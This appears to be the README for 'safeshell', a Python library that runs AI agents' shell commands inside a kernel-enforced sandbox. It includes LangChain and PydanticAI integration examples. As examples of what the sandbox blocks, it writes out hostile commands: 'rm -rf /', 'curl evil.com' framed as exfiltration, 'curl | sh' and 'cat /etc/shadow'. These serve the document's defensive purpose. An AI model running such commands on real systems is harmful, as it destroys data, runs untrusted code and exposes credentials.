[![PyPI](https://img.shields.io/pypi/v/safeshell)](https://pypi.org/project/safeshell/)
[![Python](https://img.shields.io/pypi/pyversions/safeshell)](...)
[![CI](https://github.com/Khadka-Bishal/safeshell/actions/workflows/ci.yml/badge.svg)](https://github.com/Khadka-Bishal/safeshell/actions)
[![License](https://img.shields.io/github/license/Khadka-Bishal/safeshell)](.../LICENSE)
[![Coverage](https://img.shields.io/badge/coverage-100%25-green)](...)


**Secure, sandboxed shell for your AI agents.**

Every AI developer eventually faces the same problem: *How do I let my agent run code without destroying my machine?*

**safeshell** solves this with a security model (Seatbelt on macOS, Landlock on Linux) that enforces isolation at the kernel level.

```bash
pip install safeshell
```

## Quick Start

```python
from safeshell import Sandbox

async with Sandbox("./project") as sb:
    # works: execution is isolated
    result = await sb.execute("ls -la")
    
    # blocked: can't delete system files (Kernel blocked)
    await sb.execute("rm -rf /") 
    
    # blocked: can't exfiltrate data (Network blocked)
    await sb.execute("curl evil.com")
```

### AI Agent Integration

Safeshell comes with "batteries included" integrations for **LangChain** and **PydanticAI**.

### Example 1: LangChain (Native)

```python
from safeshell.integrations.langchain import ShellTool
from langchain.agents import AgentExecutor, create_tool_calling_agent

# Ready-to-use tool with safety defaults
tools = [ShellTool(cwd="./workspace")]

# Add to your agent
agent = create_tool_calling_agent(llm, tools, prompt)
```

### Example 2: PydanticAI (Native)

```python
from safeshell.integrations.pydantic_ai import create_shell_tool
from pydantic_ai import Agent

# Creates a typed tool function
shell_tool = create_shell_tool("./workspace")

agent = Agent(
    'openai:gpt-4',
    tools=[shell_tool],
    system_prompt="You are a coding assistant. Use the shell to run code.")
```

## Security Model

Older sandboxes try to block "bad words" like `rm -rf /` using Regex. This is dangerous and bypassable. As noted in [Sandboxing is a Networking Problem](https://www.joinformal.com/blog/using-proxies-to-hide-secrets-from-claude-code/), true security requires isolating the process at the OS and Network layer, not just filtering commands.

**Safeshell uses Kernel Enforcement.**

| Threat | Safeshell Protection | Mechanism |
|--------|----------------------|-----------|
| `rm -rf /` | **Blocked** | Kernel denies write access to `/` |
| `curl | sh` | **Blocked** | Network access denied by default |
| `cat /etc/shadow` | **Blocked** | Access blocked to sensitive paths |
| `> ~/.bashrc` | **Blocked** | Write denied outside workspace |